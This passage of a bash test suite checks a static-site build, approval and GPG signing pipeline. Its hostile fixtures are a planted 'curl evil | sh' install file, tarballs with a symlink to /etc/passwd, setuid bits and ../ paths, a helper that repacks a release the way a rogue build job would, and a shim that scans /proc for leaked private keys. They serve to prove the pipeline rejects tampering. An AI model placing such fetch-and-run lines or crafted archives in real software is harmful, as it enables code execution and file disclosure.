grn "passthrough: build records the mode" bash -c "'$B' --passthrough build '$t/pt' '$t/dpt' helfa.org 0.0.1 | grep -q '^mode=passthrough' && grep -q '\"mode\": \"passthrough\"' '$t/dpt/helfa.org-0.0.1-manifest.json'"

# --- mutation of the build script: the byte comparison of the double build must bite (nothing else makes it red here)
mkdir -p "$t/mut"; cp "$here"/site-bauen.sh "$here"/site-lib.sh "$here"/site_manifest.py "$here"/site-pruefen.py "$here"/site-tar-pruefen.py "$t/mut/"
sed -i 's/"tools": {"tar": tarv, "gzip": gzv}, "files": files,/"tools": {"tar": tarv, "gzip": gzv}, "nonce": os.urandom(8).hex(), "files": files,/' "$t/mut/site-bauen.sh"
grep -q 'os.urandom' "$t/mut/site-bauen.sh" && ok "mutation: nondeterminism injected into a copy" || bad "mutation: injection did not apply (the script changed: adjust the test)"
red "mutation: a non-reproducible build is refused (the byte comparison is alive)" "$t/mut/site-bauen.sh" build "$t/src" "$t/m1" helfa.org 0.0.1
# shellcheck disable=SC2016  # the pattern is meant literally
sed -i 's/if ! diff -r "\$out" "\$chk\/again" >\/dev\/null; then/if false \&\& ! diff -r "$out" "$chk\/again" >\/dev\/null; then/' "$t/mut/site-bauen.sh"
grep -q 'if false &&' "$t/mut/site-bauen.sh" && ok "mutation: comparison switched off in the copy" || bad "mutation: switch-off did not apply (the script changed: adjust the test)"
grn "mutation control: with the comparison off the same build passes, so the red above is the comparison" "$t/mut/site-bauen.sh" build "$t/src" "$t/m2" helfa.org 0.0.1

# --- the tarball allowlist (B2): nothing but plain files and folders; each odd entry is refused BEFORE unpacking
mktar() { python3 -I - "$1" "$2" <<'PY'
import io, sys, tarfile
kind, out = sys.argv[1:3]
tf = tarfile.open(out, "w:gz", format=tarfile.GNU_FORMAT)
def add(name, typ=tarfile.REGTYPE, mode=0o644, data=b"x", link="", uid=0, mtime=1700000000):
    i = tarfile.TarInfo(name); i.type = typ; i.mode = mode; i.uid = i.gid = uid; i.mtime = mtime; i.linkname = link
    i.size = len(data) if typ == tarfile.REGTYPE else 0
    tf.addfile(i, io.BytesIO(data) if typ == tarfile.REGTYPE else None)
add("./", tarfile.DIRTYPE, 0o755); add("./index.html", data=b"<p>x</p>")
{"good": lambda: None,
 "symlink": lambda: add("./de/leak.html", tarfile.SYMTYPE, 0o777, link="/etc/passwd"),
 "hardlink": lambda: add("./h.html", tarfile.LNKTYPE, 0o644, link="./index.html"),
 "device": lambda: add("./dev", tarfile.CHRTYPE, 0o644),
 "dir777": lambda: add("./de/", tarfile.DIRTYPE, 0o777),
 "setuid": lambda: add("./x.html", mode=0o4755),
 "exec0700": lambda: add("./x.html", mode=0o700),
 "absolute": lambda: add("/etc/x.html"),
 "dotdot": lambda: add("./../x.html"),
 "dotfile": lambda: add("./.env"),
 "owner": lambda: add("./x.html", uid=1000),
 "mtime": lambda: add("./x.html", mtime=1700000999),
 "mtime0": lambda: (add("./x.html", mtime=0)),
 "twice": lambda: add("./index.html"),
 "emptydir-ok": lambda: add("./empty/", tarfile.DIRTYPE, 0o755)}[kind]()
tf.close()
PY
}
mktar good "$t/tar-good.tgz"; grn "tarball check: a tarball like site-bauen writes passes" python3 -I "$here/site-tar-pruefen.py" "$t/tar-good.tgz"
grn "tarball check: the real built tarball passes" python3 -I "$here/site-tar-pruefen.py" "$t/dist/helfa.org-0.0.1-site.tar.gz"
for k in symlink hardlink device dir777 setuid exec0700 absolute dotdot dotfile owner mtime mtime0 twice; do mktar "$k" "$t/tar-$k.tgz"; red "tarball check: $k is refused" python3 -I "$here/site-tar-pruefen.py" "$t/tar-$k.tgz"; done
echo "not a tar" > "$t/tar-junk.tgz"; red "tarball check: junk is refused" python3 -I "$here/site-tar-pruefen.py" "$t/tar-junk.tgz"

# --- the approval
exp=$(date -u -d '+24 hours' +%Y-%m-%dT%H:%M:%SZ)
approval() { # file tree tar run expires [gate] [mode]
  printf 'gate: %s\nname: helfa.org\nversion: 0.0.1\nmode: %s\ntree-sha256: %s\ntar-sha256: %s\nrun-id: %s\nexpires: %s\n' "${6:-site-signieren}" "${7:-static}" "$2" "$3" "$4" "$5" > "$1"; }
signit() { gpg --batch --yes --local-user "$1" --armor --detach-sign --output "$2.asc" "$2" 2>/dev/null; }
approval "$t/a.txt" "$tree" "$tarh" run-0001 "$exp"; signit "$appr" "$t/a.txt"
check() { "$here/site-freigabe-pruefen.sh" "${6:-$t/dist}" "$1" "$1.asc" "${2:-$t/appr.ring}" "${3:-$t/allowed}" "${4:-run-0001}" "${5:-}"; }
grn "approval: good one passes" check "$t/a.txt"
red "approval: other run id (replay) is red" check "$t/a.txt" "" "" run-0002
zero=0000000000000000000000000000000000000000000000000000000000000000
approval "$t/b.txt" "$(printf x | sha256sum | cut -d' ' -f1)" "$tarh" run-0001 "$exp"; signit "$appr" "$t/b.txt"; red "approval: for another tree hash is red" check "$t/b.txt"
approval "$t/b2.txt" "$tree" "$zero" run-0001 "$exp"; signit "$appr" "$t/b2.txt"; red "approval: for another tarball hash (the bytes) is red" check "$t/b2.txt"
approval "$t/c.txt" "$tree" "$tarh" run-0001 "$(date -u -d '-1 hour' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/c.txt"; red "approval: expired is red" check "$t/c.txt"
approval "$t/d.txt" "$tree" "$tarh" run-0001 "$(date -u -d '+10 days' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/d.txt"; red "approval: valid for more than 72 hours is red" check "$t/d.txt"
# 72 hours count from the SIGNATURE time: checked 48 h after signing, an approval that runs to signature+70h is fine, one that runs to check+70h is not
now48=$(( $(date -u +%s) + 48 * 3600 ))
approval "$t/d2.txt" "$tree" "$tarh" run-0001 "$(date -u -d '+70 hours' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/d2.txt"; grn "approval: signature+70h, checked 48 h after signing, is fine" check "$t/d2.txt" "" "" "" "$now48"
approval "$t/d3.txt" "$tree" "$tarh" run-0001 "$(date -u -d "@$((now48 + 70 * 3600))" +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/d3.txt"; red "approval: check time+70h (more than 72 h after signing) is red" check "$t/d3.txt" "" "" "" "$now48"
red "approval: signature dated in the future (check time is a day earlier) is red" check "$t/a.txt" "" "" "" "$(( $(date -u +%s) - 86400 ))"
approval "$t/e.txt" "$tree" "$tarh" run-0001 "$exp"; signit "$other" "$t/e.txt"
red "approval: signed by a stranger (not on the list) is red" check "$t/e.txt" "$t/other.ring"
red "approval: stranger's key not in the keyring is red" check "$t/e.txt"
approval "$t/f.txt" "$tree" "$tarh" run-0001 "$exp" other-gate; signit "$appr" "$t/f.txt"; red "approval: another gate is red" check "$t/f.txt"
approval "$t/f2.txt" "$tree" "$tarh" run-0001 "$exp" site-signieren passthrough; signit "$appr" "$t/f2.txt"; red "approval: mode passthrough against a static build is red" check "$t/f2.txt"
approval "$t/f3.txt" "$tree" "$tarh" run-0001 "$exp" site-signieren wild; signit "$appr" "$t/f3.txt"; red "approval: unknown mode is red" check "$t/f3.txt"
cp "$t/a.txt" "$t/g.txt"; cp "$t/a.txt.asc" "$t/g.txt.asc"; echo "extra: 1" >> "$t/g.txt"; red "approval: text changed after signing is red" check "$t/g.txt"
cp "$t/a.txt" "$t/h.txt"; : > "$t/h.txt.asc"; red "approval: empty signature file is red" check "$t/h.txt"
red "approval: missing approval file is red" check "$t/none.txt"
: > "$t/empty-allowed"; red "approval: empty allowed list is red" check "$t/a.txt" "" "$t/empty-allowed"
printf '%s\n' "not-a-fingerprint" > "$t/junk-allowed"; red "approval: junk in the allowed list is red" check "$t/a.txt" "" "$t/junk-allowed"
approval "$t/i.txt" "$tree" "$tarh" run-0001 "$exp"; echo "tree-sha256: $tree" >> "$t/i.txt"; signit "$appr" "$t/i.txt"; red "approval: key twice is red" check "$t/i.txt"
red "approval: unsigned text (a plain event) is red" "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/a.txt" "$t/none.asc" "$t/appr.ring" "$t/allowed" run-0001
# the signing SUBKEY is what is pinned: the primary fingerprint does not stand for a software subkey under it
approval "$t/j.txt" "$tree" "$tarh" run-0001 "$exp"; gpg --batch --yes --local-user "$sub2!" --armor --detach-sign --output "$t/j.txt.asc" "$t/j.txt" 2>/dev/null
printf '%s\n' "$appr2" > "$t/allow-primary"; printf '%s\n' "$sub2" > "$t/allow-sub"; printf '%s\n' "$appr2" > "$t/allow-sub-other"
red "approval: signed by a subkey while only the primary key is listed is red" check "$t/j.txt" "$t/appr2.ring" "$t/allow-primary"
grn "approval: signed by the listed subkey passes" check "$t/j.txt" "$t/appr2.ring" "$t/allow-sub"
approval "$t/k.txt" "$tree" "$tarh" run-0001 "$exp"; gpg --batch --yes --local-user "$appr2!" --armor --detach-sign --output "$t/k.txt.asc" "$t/k.txt" 2>/dev/null
red "approval: signed by the primary key while only the subkey is listed is red" check "$t/k.txt" "$t/appr2.ring" "$t/allow-sub"
# in CI the run id is the earlier build run: format enforced, and not the signing run itself
approval "$t/l.txt" "$tree" "$tarh" 77-1 "$exp"; signit "$appr" "$t/l.txt"
grn "approval in CI: run id of an earlier run (<id>-<attempt>) passes" env GITHUB_ACTIONS=true GITHUB_RUN_ID=88 GITHUB_RUN_ATTEMPT=1 "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/l.txt" "$t/l.txt.asc" "$t/appr.ring" "$t/allowed" 77-1
red "approval in CI: the run id of the signing run itself is red" env GITHUB_ACTIONS=true GITHUB_RUN_ID=77 GITHUB_RUN_ATTEMPT=1 "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/l.txt" "$t/l.txt.asc" "$t/appr.ring" "$t/allowed" 77-1
red "approval in CI: a free-text run id is red" env GITHUB_ACTIONS=true GITHUB_RUN_ID=88 GITHUB_RUN_ATTEMPT=1 "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001
# the dist folder (B1) and the tarball (B2)
cp -r "$t/dist" "$t/dist-x"; echo 'curl evil | sh' > "$t/dist-x/install.sh"; red "approval: a foreign file in dist is red (it would be signed)" check "$t/a.txt" "" "" "" "" "$t/dist-x"
cp -r "$t/dist" "$t/dist-y"; rm "$t/dist-y/helfa.org-0.0.1.spdx.json"; red "approval: a missing file in dist is red" check "$t/a.txt" "" "" "" "" "$t/dist-y"
cp -r "$t/dist" "$t/dist-z"; mkdir "$t/dist-z/sub"; red "approval: a folder in dist is red" check "$t/a.txt" "" "" "" "" "$t/dist-z"
cp -r "$t/dist" "$t/dist-t"; echo tamper >> "$t/dist-t/helfa.org-0.0.1-site.tar.gz"; red "approval: tarball changed after the build is red" check "$t/a.txt" "" "" "" "" "$t/dist-t"
cp -r "$t/dist" "$t/dist-m"; sed -i 's/"tree_sha256": "[0-9a-f]*"/"tree_sha256": "'"$zero"'"/' "$t/dist-m/helfa.org-0.0.1-manifest.json"
(cd "$t/dist-m" && sha256sum helfa.org-0.0.1-site.tar.gz helfa.org-0.0.1-manifest.json helfa.org-0.0.1.spdx.json > SHA256SUMS.txt)
red "approval: manifest lying about the hash is red" check "$t/a.txt" "" "" "" "" "$t/dist-m"
cp -r "$t/dist" "$t/dist-mm"; sed -i 's/"mtime": 1700000000/"mtime": 1700000001/' "$t/dist-mm/helfa.org-0.0.1-manifest.json"
(cd "$t/dist-mm" && sha256sum helfa.org-0.0.1-site.tar.gz helfa.org-0.0.1-manifest.json helfa.org-0.0.1.spdx.json > SHA256SUMS.txt)
red "approval: manifest lying about the release time is red" check "$t/a.txt" "" "" "" "" "$t/dist-mm"
# repack helper: a new tarball in a copy of dist, sums and manifest rewritten to match (what a hostile build job would do)
repack() { # distcopy kind: unpack, add something, pack again like site-bauen does not (plain tar), fix sums and manifest
  local d=$1 kind=$2 w="$t/rp-$2"; rm -rf "$w"; mkdir -p "$w"; tar -xzf "$d/helfa.org-0.0.1-site.tar.gz" -C "$w"
  case $kind in
    symlink) mkdir -p "$w/de"; ln -s /etc/passwd "$w/de/leak.html"; chmod 777 "$w/de" ;;
    emptydir) mkdir "$w/empty" ;;
    exec) chmod 755 "$w/index.html" ;;
  esac
  (cd "$w" && tar --sort=name --mtime=@"$SITE_MTIME" --owner=0 --group=0 --numeric-owner --format=gnu -cf - .) | gzip -n -9 > "$d/helfa.org-0.0.1-site.tar.gz"
  new=$(sha256sum "$d/helfa.org-0.0.1-site.tar.gz" | cut -d' ' -f1)
  sed -i 's/"tar_sha256": "[0-9a-f]*"/"tar_sha256": "'"$new"'"/' "$d/helfa.org-0.0.1-manifest.json"
  (cd "$d" && sha256sum helfa.org-0.0.1-site.tar.gz helfa.org-0.0.1-manifest.json helfa.org-0.0.1.spdx.json > SHA256SUMS.txt)
  echo "$new"
}
cp -r "$t/dist" "$t/dist-l"; ntar=$(repack "$t/dist-l" symlink)
red "approval: the old approval does not cover a repacked tarball with a symlink and a 0777 folder" check "$t/a.txt" "" "" "" "" "$t/dist-l"
approval "$t/m.txt" "$tree" "$ntar" run-0001 "$exp"; signit "$appr" "$t/m.txt"
red "approval: even an approval of those exact bytes is red (symlink, 0777 folder: allowlist)" check "$t/m.txt" "" "" "" "" "$t/dist-l"
cp -r "$t/dist" "$t/dist-e"; repack "$t/dist-e" emptydir >/dev/null
red "approval: same files plus an empty folder (same tree hash, other bytes) is red: the bytes are bound" check "$t/a.txt" "" "" "" "" "$t/dist-e"
cp -r "$t/dist" "$t/dist-p"; repack "$t/dist-p" exec >/dev/null
red "approval: same files with an execute bit (same tree hash, other bytes) is red: the bytes are bound" check "$t/a.txt" "" "" "" "" "$t/dist-p"

# --- signing: order key last, rebuild from the approved source, nothing foreign
rm -rf "$t/d1"; cp -r "$t/dist" "$t/d1"
S="$here/site-signieren.sh"
sign() { # dist [approval] [src] [run]
  GPG_PRIVATE_KEY=$(cat "$t/rel.sec.asc") "$S" "$1" "${2:-$t/a.txt}" "${2:-$t/a.txt}.asc" "$t/appr.ring" "$t/allowed" "${4:-run-0001}" "$t/rel.pub.asc" "${3:-$t/src}"; }
red "sign: without the key is red (not 'not signed, exit 0')" env -u GPG_PRIVATE_KEY "$S" "$t/d1" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc" "$t/src"
red "sign: with a bad approval signs nothing" sign "$t/d1" "$t/e.txt"
[ -z "$(find "$t/d1" -name '*.asc' -print -quit)" ] && ok "sign: a bad approval left no .asc" || bad "sign: a bad approval left no .asc"
rm -rf "$t/d3"; cp -r "$t/dist" "$t/d3"; echo 'curl evil | sh' > "$t/d3/install.sh"
red "sign: a foreign file in dist is red" sign "$t/d3"
[ ! -e "$t/d3/install.sh.asc" ] && [ -z "$(find "$t/d3" -name '*.asc' -print -quit)" ] && ok "sign: the foreign file got no release signature" || bad "sign: the foreign file got a signature"
rm -rf "$t/srcx"; cp -r "$t/src" "$t/srcx"; echo '<p>other</p>' >> "$t/srcx/index.html"
rm -rf "$t/d4"; cp -r "$t/dist" "$t/d4"
red "sign: a rebuild from another source than the approved one is red" sign "$t/d4" "$t/a.txt" "$t/srcx"
[ -z "$(find "$t/d4" -name '*.asc' -print -quit)" ] && ok "sign: the rebuild comparison came before the key (no .asc)" || bad "sign: .asc after a failed rebuild comparison"
grn "sign: good approval and the approved source sign" sign "$t/d1"
grn "sign: every file has a signature (signatures-check)" "$here/site-signaturen-pruefen.sh" "$t/d1" "$t/rel.pub.asc" helfa.org-0.0.1
cp -r "$t/d1" "$t/d5"; echo x > "$t/d5/install.sh"; red "signatures-check: a foreign file next to the signed ones is red" "$here/site-signaturen-pruefen.sh" "$t/d5" "$t/rel.pub.asc" helfa.org-0.0.1
cp -r "$t/d1" "$t/d6"; rm "$t/d6/SHA256SUMS.txt.asc"; red "signatures-check: a missing .asc is red" "$here/site-signaturen-pruefen.sh" "$t/d6" "$t/rel.pub.asc" helfa.org-0.0.1
cp -r "$t/d1" "$t/d7"; echo x >> "$t/d7/helfa.org-0.0.1.spdx.json"; red "signatures-check: a changed file is red" "$here/site-signaturen-pruefen.sh" "$t/d7" "$t/rel.pub.asc" helfa.org-0.0.1
red "signatures-check: wrong public key is red" "$here/site-signaturen-pruefen.sh" "$t/d1" "$t/other.pub" helfa.org-0.0.1
rm -rf "$t/d2"; cp -r "$t/dist" "$t/d2"
red "sign: wrong public key for the check is red" env "GPG_PRIVATE_KEY=$(cat "$t/rel.sec.asc")" "$S" "$t/d2" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/other.pub" "$t/src"

# --- the key as a FILE, not in an environment (children must not read it from /proc/<pid>/environ of a parent), and the check-only step
chmod 600 "$t/rel.sec.asc"
rm -rf "$t/d8"; cp -r "$t/dist" "$t/d8"
grn "check-only: approval, rebuild and sums are checked with NO key anywhere" env -u GPG_PRIVATE_KEY -u GPG_PRIVATE_KEY_FILE "$S" --check-only "$t/d8" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc" "$t/src"
[ -z "$(find "$t/d8" -name '*.asc' -print -quit)" ] && [ ! -e "$t/d8/approval.txt" ] && ok "check-only: wrote nothing into dist" || bad "check-only: wrote into dist"
red "check-only: a bad approval is red without a key too" env -u GPG_PRIVATE_KEY -u GPG_PRIVATE_KEY_FILE "$S" --check-only "$t/d8" "$t/e.txt" "$t/e.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc" "$t/src"
red "check-only: a rebuild from another source is red without a key too" env -u GPG_PRIVATE_KEY -u GPG_PRIVATE_KEY_FILE "$S" --check-only "$t/d8" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc" "$t/srcx"
mkdir -p "$t/shim"; real_gpg=$(command -v gpg)
cat > "$t/shim/gpg" <<'SH'
#!/bin/bash
# test shim: before the real gpg runs, look for the private key in the environment of this process and of every ancestor (what a child can read)
p=$$
while [ "$p" -gt 1 ]; do
  tr '\0' '\n' < "/proc/$p/environ" 2>/dev/null | grep -q 'BEGIN PGP PRIVATE KEY' && echo "key in environ of pid $p ($(tr '\0' ' ' < /proc/$p/cmdline | cut -c1-60))" >> "$LEAKLOG"
  p=$(awk '{print $4}' "/proc/$p/stat" 2>/dev/null) || break; [ -n "$p" ] || break
done
exec "$REALGPG" "$@"
SH
chmod +x "$t/shim/gpg"
rm -rf "$t/d9"; cp -r "$t/dist" "$t/d9"; : > "$t/leak-file"
grn "sign with the key as a FILE: signs, and every signature verifies" env "PATH=$t/shim:$PATH" "REALGPG=$real_gpg" "LEAKLOG=$t/leak-file" GPG_PRIVATE_KEY_FILE="$t/rel.sec.asc" "$S" "$t/d9" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc" "$t/src"
[ ! -s "$t/leak-file" ] && ok "key as a file: no process (gpg and its ancestors) holds the key in its environment" || { bad "key as a file: a process holds the key in its environment"; cat "$t/leak-file"; }
rm -rf "$t/d10"; cp -r "$t/dist" "$t/d10"; : > "$t/leak-env"
env "PATH=$t/shim:$PATH" "REALGPG=$real_gpg" "LEAKLOG=$t/leak-env" "GPG_PRIVATE_KEY=$(cat "$t/rel.sec.asc")" "$S" "$t/d10" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc" "$t/src" >/dev/null 2>&1
[ -s "$t/leak-env" ] && ok "control: with the key in the environment the shim DOES see it in the ancestors (so the test above can go red)" || bad "control: the shim sees nothing even with the key in the environment (the test above proves nothing)"
red "sign: GPG_PRIVATE_KEY_FILE empty is red" env GPG_PRIVATE_KEY_FILE=/dev/null -u GPG_PRIVATE_KEY "$S" "$t/d9" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/rel.pub.asc" "$t/src"

# --- templates
T="$root/templates/site"
[ ! -e "$T/sites" ] && [ ! -e "$T/port80" ] && [ ! -e "$T/gen-pages.sh" ] && ok "templates: no placeholder pages are kept in git" || bad "templates: placeholder pages are back"
export ACME_EMAIL=admin@example.org
R="$T/render.sh"
mktoml "$t/s1.toml" one.example.org static www.one.example.org; mktoml "$t/s2.toml" two.example.org static; mktoml "$t/s3.toml" three.example.org passthrough
SITES=(--allow-passthrough --site "$t/s1.toml" --site "$t/s2.toml" --site "$t/s3.toml")
grn "render: staging is the default" bash -c "'$R' '${SITES[*]}' '$t/s.kdl' >/dev/null 2>&1 || '$R' ${SITES[*]} '$t/s.kdl' >/dev/null 2>&1; grep -q 'staging #true' '$t/s.kdl' && ! grep -q '@[A-Z0-9_]*@' '$t/s.kdl'"
grn "render: production" bash -c "'$R' --production ${SITES[*]} '$t/p.kdl' >/dev/null 2>&1 && grep -q 'staging #false' '$t/p.kdl'"
grn "render: names come from the site.toml files: aliases get a route and are in the certificate" bash -c "grep -q 'host \"www.one.example.org\"' '$t/s.kdl' && grep -q 'domains \"one.example.org\" \"www.one.example.org\"' '$t/s.kdl' && [ \$(grep -c 'acme {' '$t/s.kdl') = 3 ]"
hostfiles=$(cd "$root" && for f in scripts/site* templates/site/* .github/workflows/site.yml; do case $f in scripts/test-site.sh|templates/site/README.md) ;; *) echo "$f" ;; esac; done)
[ "$(wc -l <<<"$hostfiles")" -ge 15 ] && grep -q 'site-signaturen-pruefen.sh' <<<"$hostfiles" && grep -q 'site-tar-pruefen.py' <<<"$hostfiles" && ok "host-name grep covers every scripts/site*, templates/site/* (README aside) and site.yml" || bad "host-name grep file list"
grn "templates and scripts name no host of the three real domains (fixtures only)" bash -c "cd '$root' && ! grep -n -E 'freesynergy\.net|helfa\.org|freeplanetearth\.org' $(tr '\n' ' ' <<<"$hostfiles")"
for f in scripts/site-signaturen-pruefen.sh scripts/site-tar-pruefen.py; do
  rm -rf "$t/hm"; mkdir -p "$t/hm/scripts"; (cd "$root" && cp -r --parents $hostfiles "$t/hm/"); echo '# helfa.org' >> "$t/hm/$f"
  red "mutation: a real host name in $f is found by the grep" bash -c "cd '$t/hm' && ! grep -n -E 'freesynergy\.net|helfa\.org|freeplanetearth\.org' $(tr '\n' ' ' <<<"$hostfiles")"
done
grn "render: port 80 is a real 301 redirect (namespace + redirect filter), no page served" bash -c "grep -q 'type \"redirect\"' '$t/s.kdl' && grep -q 'status-code 301' '$t/s.kdl' && grep -q 'namespace \"redirect\"' '$t/s.kdl' && ! grep -q '_port80' '$t/s.kdl'"
grn "render: roots end in /current of the primary name (what the delivery step swaps)" bash -c "grep -q 'root \"/srv/www/one.example.org/current\"' '$t/s.kdl' && ! grep -q 'root \"/srv/www/www' '$t/s.kdl'"
grn "render: CSP strict by default, passthrough only for the site that says so (and warns)" bash -c "'$R' ${SITES[*]} '$t/c.kdl' 2>'$t/w' >/dev/null; [ \$(grep -c \"script-src 'self'\" '$t/c.kdl') = 1 ] && [ \$(grep -c \"default-src 'none'\" '$t/c.kdl') = 3 ] && grep -q WARNING '$t/w'"
grn "render: csp.policy of site.toml replaces the preset" bash -c "printf 'schema = 1\npurpose = \"website\"\n[names]\nprimary = \"four.example.org\"\n[acme]\nmethod = \"http-01\"\n[csp]\npolicy = \"default-src self; img-src https://cdn.example.org\"\n' > '$t/s4.toml' && '$R' --site '$t/s4.toml' '$t/c4.kdl' >/dev/null && grep -q 'img-src https://cdn.example.org' '$t/c4.kdl'"
red "render: a passthrough site without --allow-passthrough is refused (CSP is not delivered in 26.11_2)" "$R" --site "$t/s1.toml" --site "$t/s3.toml" "$t/x.kdl"
red "render: the same refusal holds for --http-only and --production" bash -c "'$R' --http-only --site '$t/s3.toml' '$t/x.kdl' || '$R' --production --site '$t/s3.toml' '$t/x.kdl'"
grn "render: a static site needs no flag and its note says the CSP header is not delivered" bash -c "'$R' --site '$t/s1.toml' '$t/x1.kdl' 2>'$t/w1' >/dev/null && grep -q 'NOT delivered' '$t/w1'"
red "render: the same name in two sites is refused" "$R" --site "$t/s1.toml" --site "$t/s1.toml" "$t/x.kdl"
red "render: no --site is refused" "$R" "$t/x.kdl"
red "render: a bad site.toml is refused" "$R" --site "$t/f-dns01/site.toml" "$t/x.kdl"
grn "render: writes <file>.sha256 that checks, and renders the same bytes twice" bash -c "'$R' ${SITES[*]} '$t/r1.kdl' >/dev/null 2>&1 && '$R' ${SITES[*]} '$t/r2.kdl' >/dev/null 2>&1 && (cd '$t' && sha256sum --check --quiet r1.kdl.sha256) && cmp '$t/r1.kdl' '$t/r2.kdl'"
grn "render: --http-only (first start) has no ACME and no TLS" bash -c "'$R' --http-only ${SITES[*]} '$t/h.kdl' >/dev/null 2>&1 && ! grep -q 'acme' '$t/h.kdl' && ! grep -q 'protocol \"https\"' '$t/h.kdl' && grep -q '/current\"' '$t/h.kdl'"
red "render: --install-pages is gone (no unchecked copy from git)" "$R" --install-pages --site "$t/s1.toml" "$t/x.kdl"
red "render: path in WEBROOT refused" env WEBROOT='/srv/../etc' "$R" --site "$t/s1.toml" "$t/x.kdl"
red "render: ACME needs an e-mail address" env -u ACME_EMAIL "$R" --site "$t/s1.toml" "$t/x.kdl"
# --- site.toml schema 2: several sites on one domain (site.id, path_prefix, languages, [[csp.area]]); schema 1 stays valid
mk2() { # file id primary prefix [site-extra-lines] [tail tables]
  printf 'schema = 2\npurpose = "website"\n[site]\nid = "%s"\npath_prefix = "%s"\nlanguages = ["en", "de"]\n%s\n[names]\nprimary = "%s"\n[acme]\nmethod = "http-01"\n%s\n' "$2" "$4" "${5:-}" "$3" "${6:-}" > "$1"; }
f2() { rm -rf "$t/g-$1"; cp -r "$t/src" "$t/g-$1"; mk2 "$t/g-$1/site.toml" "${@:2}"; }
f2 ok wiki wiki.example.org /wiki; grn "schema 2: a site with id, path_prefix and languages passes the folder check" "$B" check "$t/g-ok"
f2 root landing example.org /; grn "schema 2: a site at the root of its host passes" "$B" check "$t/g-root"
grn "schema 1: the old file stays valid unchanged (control of the schema 2 refusals)" "$B" check "$t/src"
f2 xn wiki xn--bcher-kva.example.org /wiki; grn "schema 2: an A-label host name (xn--...) passes" "$B" check "$t/g-xn"
f2 xn-tld wiki example.xn--p1ai /wiki; grn "schema 2: an A-label as the last label passes" "$B" check "$t/g-xn-tld"
f2 xn-bad wiki 'xn--@@.example.org' /wiki; red "schema 2: a broken A-label is refused" "$B" check "$t/g-xn-bad"
f2 xn-punycode wiki 'xn--a-.example.org' /wiki; red "schema 2: an A-label that is not Punycode is refused" "$B" check "$t/g-xn-punycode"
f2 idn wiki 'bücher.example.org' /wiki; red "schema 2: a Unicode name must be given as A-label (refused)" "$B" check "$t/g-idn"
f2 upper wiki 'Wiki.example.org' /wiki; red "schema 2: an upper-case name is refused" "$B" check "$t/g-upper"
f2 onelabel wiki 'localhost' /wiki; red "schema 2: one label is refused" "$B" check "$t/g-onelabel"
f2 nl-host wiki 'wiki.example.org\n' /wiki; red "schema 2: a host name with a line break is refused (fullmatch)" "$B" check "$t/g-nl-host"
f2 long wiki "$long" /wiki; red "schema 2: a name over 253 characters is refused" "$B" check "$t/g-long"
for c in 'dotdot|/..' 'dotdot-mid|/a/../b' 'dot|/.' 'dotfile|/.hidden' 'backslash|/a\\b' 'backslash-lead|\\wiki' 'pct|/%2e%2e' 'upper|/Wiki' 'empty-seg|/a//b' 'trailing|/wiki/' 'five|/a/b/c/d/e' 'fs|/_fs' 'fs-in|/_fs/x' 'noslash|wiki' 'quote|/a\"b' 'brace|/a{b}' 'semi|/a;b' 'colon|/a:b' 'query|/a?b' 'hash|/a#b' 'space|/a b' 'nl|/a\nb' 'nul|/a\u0000b' 'long|/'"$(printf 'a%.0s' $(seq 101))"; do
  IFS='|' read -r n pfx <<<"$c"; f2 "pfx-$n" wiki wiki.example.org "$pfx"; red "schema 2: path_prefix '$n' is refused" "$B" check "$t/g-pfx-$n"
done
f2 pfx-four wiki wiki.example.org /a/b/c/d; grn "schema 2: a prefix of four segments passes (the limit is four)" "$B" check "$t/g-pfx-four"
for c in 'upper|Wiki' 'lead-dash|-wiki' 'trail-dash|wiki-' 'under|wi_ki' 'dot|wi.ki' 'empty|' 'long|'"$(printf 'a%.0s' $(seq 33))" 'space|a b' 'nl|a\nb'; do
  IFS='|' read -r n id <<<"$c"; f2 "id-$n" "$id" wiki.example.org /wiki; red "schema 2: site.id '$n' is refused" "$B" check "$t/g-id-$n"
done
f2 id-short a wiki.example.org /wiki; grn "schema 2: a one-character id passes" "$B" check "$t/g-id-short"
f2 id-32 "$(printf 'a%.0s' $(seq 32))" wiki.example.org /wiki; grn "schema 2: an id of 32 characters passes" "$B" check "$t/g-id-32"
f2 host-key wiki wiki.example.org /wiki 'host = "x.example.org"'; red "schema 2: a \`host\` key is refused (the host is names.primary)" "$B" check "$t/g-host-key"
f2 name-ok wiki wiki.example.org /wiki 'name = "Example Wiki"'; grn "schema 2: site.name passes" "$B" check "$t/g-name-ok"
f2 name-ctl wiki wiki.example.org /wiki 'name = "a\u0007b"'; red "schema 2: site.name with a control character is refused" "$B" check "$t/g-name-ctl"
f2 name-long wiki wiki.example.org /wiki "name = \"$(printf 'a%.0s' $(seq 81))\""; red "schema 2: site.name over 80 characters is refused" "$B" check "$t/g-name-long"
f2 lang-default wiki wiki.example.org /wiki 'default_language = "fr"'; red "schema 2: default_language not in languages is refused" "$B" check "$t/g-lang-default"
f2 lang-dup wiki wiki.example.org /wiki 'languages = ["en", "en"]'; red "schema 2: a language twice is refused" "$B" check "$t/g-lang-dup"
f2 lang-bad wiki wiki.example.org /wiki 'languages = ["EN"]'; red "schema 2: an upper-case language tag is refused" "$B" check "$t/g-lang-bad"
